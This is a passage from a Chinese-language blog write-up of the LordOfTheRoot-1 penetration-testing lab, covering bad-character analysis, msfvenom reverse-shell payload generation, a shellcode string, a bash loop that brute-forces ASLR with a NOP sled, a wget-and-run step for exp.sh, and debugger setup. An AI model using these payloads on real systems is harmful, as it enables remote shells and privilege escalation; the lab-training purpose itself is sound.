<p>能看到1-8是正常的，后门就全乱了，怀疑0x08后面的0x00和0x09是个坏字符，至于后面全乱序猜测是因为0x0a换行符的问题。重新来，去掉0x09和0x0a：</p>
<p>好看多了，但是从0x20又开始乱了，去掉0x20后门就好了。<br>注意：这一定要仔细看，因为看少了看错了都会导致msf的payload执行不成功！<br>重新来，去掉0x09、0x0a和0x20：</p>
<p>坏字符总结为0x09、0x0a、0x20、再加个0x00！（默认排除空字节\x00）</p>
<h2 id="8）msf生成payload"><a href="#8）msf生成payload" class="headerlink" title="8）msf生成payload"></a>8）msf生成payload</h2><p>windows：<br>msfvenom -p windows/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 EXITFUNC=thread -b “\x00\x0a\x0d” -f py -v</p>
<p>Linux：<br>msfvenom -a x86 –platform linux -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b “\x00\x09\x0a\x20” EXITFUNC=thread -f c</p>
<p>linux2：<br>msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b ‘\x00\x09\x0a\x20’ -e x86/shikata_ga_nai -fc</p>
<p>payload：<br>-a  框架选择<br>-p 载荷类型</p>
<p>LHOST 本机地址<br>LPORT</p>
<p>-b 坏字符<br>-e 要使用的编码器<br>-f 编译的语言<br>-c 指定要包含的附加 win32 shellcode 文件</p>
<h2 id="v-载荷的名称"><a href="#v-载荷的名称" class="headerlink" title="-v 载荷的名称"></a>-v 载荷的名称</h2><p>9）查看jmp<br>最后需要看看是否有调用jmp到es（因为我们无法控制 eax），查看能够更好的控制漏洞利用的过程，防止不成功。</p>
<p>objdump -D file | grep -P ‘jmp|call’ | grep esp</p>
<p>回显esp，不需要jmp做跳板到shellcode，接下来绕过就是用大量的nop即可！</p>
<p>10）bash执行shell</p>
<p>“\xb8\x37\xc9\x64\x34\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\xc2\xa3\x6f\x6c\xb5\x66\x16\xe4\xe8\xe5\x5f\x13\x9a\xc6\x2c\xb4\x5a\x71\xfc\x26\x33\xef\x8b\x44\x91\x07\x83\x8a\x15\xd8\xbb\xe8\x7c\xb6\xec\x9f\x16\x46\xa4\x0c\x6f\xa7\x87\x33”</p>
<hr>
<p>0xbf96b590<br>bf 96 b5 90<br>\x90\xb5\x96\xbf</p>
<p>#!/bin/bash<br>while true; do<br>  $(find /SECRET -type f -size 5150c) $(python -c ‘print “A”*171 + “\x90\xb5\x96\xbf” + “\x90”*20000 + “\xb8\x37\xc9\x64\x34\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\xc2\xa3\x6f\x6c\xb5\x66\x16\xe4\xe8\xe5\x5f\x13\x9a\xc6\x2c\xb4\x5a\x71\xfc\x26\x33\xef\x8b\x44\x91\x07\x83\x8a\x15\xd8\xbb\xe8\x7c\xb6\xec\x9f\x16\x46\xa4\x0c\x6f\xa7\x87\x33”‘) 2&gt; /dev/null<br>  sleep 1<br>done</p>
<p>ls -la   —查看文件大小<br>-size  —表示文件大小<br>-type  —文件类型  </p>
<h2 id="f-普通文件"><a href="#f-普通文件" class="headerlink" title="f 普通文件"></a>f 普通文件</h2><p>wget <a target="_blank" rel="noopener" href="http://192.168.133.19:8081/exp.sh">http://192.168.133.19:8081/exp.sh</a><br>chmod +x exp.sh<br>./exp.sh<br>成功！！！</p>
<p>1、文件会随机变动到三个文件夹中！<br>2、python脚本计划任务在执行随机变动<br>3、ALSR开启了安全保护   —绕过是nop  for循环碰撞<br>4、checksec安全保护机制没开启<br>5、jmp esp 不需要<br>6、解决坏字符问题</p>
<p>延伸出问题：<br>4、checksec安全保护机制没开启<br>5、jmp esp 不需要<br>checksec有六种机制，如果开启了某个，怎么去绕过！….待思考？？？<br>jmp esp怎么去查看他的地址值！？？？</p>
<p>这些问题都搞懂了，缓冲区溢出基本就读懂%70~80<br>后面还要读懂一些函数指令！</p>
<hr>
<p>方法3：<br>GDB进行分析！peda安装：<br>参考文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda<br>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit<br>想要用某一个插件的时候，只要输入对应命令就行！</p>
<p>gdb file    —gdb分析file文件</p>
<p>在peda中运行，EIP被我们的4<em>B覆盖，ESP寄存器指向我们4</em>C：<br>r $(python -c ‘print “A”*171 + “B”*4 + “C”*4’)<br>EBP: 0x41414141 (‘AAAA’)<br>ESP: 0xffffcfe0 (“CCCC”)<br>EIP: 0x42424242 (‘BBBB’)</p>
<hr>
<p>方法4：<br>安装：edb<br>proxychains apt install edb-debugger</p>
<p>目前已经知道171会导致程序崩溃，创建一个通用脚本测试EIP看看4个B会不会出现：</p>
<p>#!/usr/bin/python<br>padding = “A” * 171<br>eip = “B” * 4<br>shellcode = “C” * 4<br>buffer = padding + eip + shellcode</p>
<p>print buffer;</p>
<p>edb –run ./file $(python testtest.py)</p>
<hr>
<p>pwn环境搭建：<br><a target="_blank" rel="noopener" href="https://mambainveins.com/2021/07/23/2021/2021-07-23-pwn_env/">https://mambainveins.com/2021/07/23/2021/2021-07-23-pwn_env/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whbing1471/article/details/112410599">https://blog.csdn.net/whbing1471/article/details/112410599</a></p>
<p><a target="_blank" rel="noopener" href="https://isbase.cc/tip/exploit/tip-2.html">https://isbase.cc/tip/exploit/tip-2.html</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin">https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin</a><br><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-10769062-id-4220113.html">http://blog.chinaunix.net/uid-10769062-id-4220113.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">xxxRetr0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/24/%E6%B8%97%E9%80%8F-LordOfTheRoot-1/">http://example.com/2024/02/24/%E6%B8%97%E9%80%8F-LordOfTheRoot-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pentest/">Pentest</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/02/06/%E6%B8%97%E9%80%8F-w1r3s-1/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">渗透-w1r3s-1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透-Lampiao"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-01</div><div class="title">渗透-Lampiao</div></div></a></div><div><a href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透-Raven-2"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-02</div><div class="title">渗透-Raven-2</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xxxRetr0</div><div class="author-info__description">yaHuuuuuu</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">51</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxRetr0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AA%E8%83%BD%E6%9C%AC%E5%9C%B0%E7%99%BB%E5%BD%95%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">只能本地登录！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-exec-%E2%80%98-bin-sh%E2%80%99"><span class="toc-number">2.</span> <span class="toc-text">find &#x2F; -exec ‘&#x2F;bin&#x2F;sh’ ;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-perm-g-s-o-perm-4000-type-l-maxdepth-3-exec-ls-ld-2-gt-dev-null"><span class="toc-number">3.</span> <span class="toc-text">find &#x2F; -perm -g&#x3D;s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} ; 2&gt;&#x2F;dev&#x2F;null</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ls-lahR"><span class="toc-number">4.</span> <span class="toc-text">ls -lahR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%B2%E4%B8%8E%E5%AD%97%E8%8A%82%E6%95%B0%E7%BB%84%E7%9B%B8%E5%90%8C%E7%9A%84%E5%9D%8F%E5%AD%97%E7%AC%A6%E3%80%82%E4%BB%A5%E4%B8%8B-python-%E8%84%9A%E6%9C%AC%E5%8F%AF%E7%94%A8%E4%BA%8E%E7%94%9F%E6%88%90%E4%BB%8E-x01-%E5%88%B0-xff-%E7%9A%84%E5%9D%8F%E5%AD%97%E7%AC%A6%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#print"><span class="toc-number">6.</span> <span class="toc-text">print()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%EF%BC%89msf%E7%94%9F%E6%88%90payload"><span class="toc-number">7.</span> <span class="toc-text">8）msf生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#v-%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%90%8D%E7%A7%B0"><span class="toc-number">8.</span> <span class="toc-text">-v 载荷的名称</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#f-%E6%99%AE%E9%80%9A%E6%96%87%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">f 普通文件</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/02/24/%E6%B8%97%E9%80%8F-LordOfTheRoot-1/" title="渗透-LordOfTheRoot-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-LordOfTheRoot-1"/></a><div class="content"><a class="title" href="/2024/02/24/%E6%B8%97%E9%80%8F-LordOfTheRoot-1/" title="渗透-LordOfTheRoot-1">渗透-LordOfTheRoot-1</a><time datetime="2024-02-24T02:59:59.000Z" title="Created 2024-02-24 10:59:59">2024-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/06/%E6%B8%97%E9%80%8F-w1r3s-1/" title="渗透-w1r3s-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-w1r3s-1"/></a><div class="content"><a class="title" href="/2024/02/06/%E6%B8%97%E9%80%8F-w1r3s-1/" title="渗透-w1r3s-1">渗透-w1r3s-1</a><time datetime="2024-02-06T14:01:09.000Z" title="Created 2024-02-06 22:01:09">2024-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/" title="渗透-Tr0ll-1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-Tr0ll-1"/></a><div class="content"><a class="title" href="/2024/02/05/%E6%B8%97%E9%80%8F-Tr0ll-1/" title="渗透-Tr0ll-1">渗透-Tr0ll-1</a><time datetime="2024-02-05T15:30:44.000Z" title="Created 2024-02-05 23:30:44">2024-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透-Raven-2"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-Raven-2"/></a><div class="content"><a class="title" href="/2024/02/02/%E6%B8%97%E9%80%8F-Raven-2/" title="渗透-Raven-2">渗透-Raven-2</a><time datetime="2024-02-02T14:19:46.000Z" title="Created 2024-02-02 22:19:46">2024-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透-Lampiao"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透-Lampiao"/></a><div class="content"><a class="title" href="/2024/02/01/%E6%B8%97%E9%80%8F-Lampiao/" title="渗透-Lampiao">渗透-Lampiao</a><time datetime="2024-02-01T12:16:07.000Z" title="Created 2024-02-01 20:16:07">2024-02-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By xxxRetr0</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>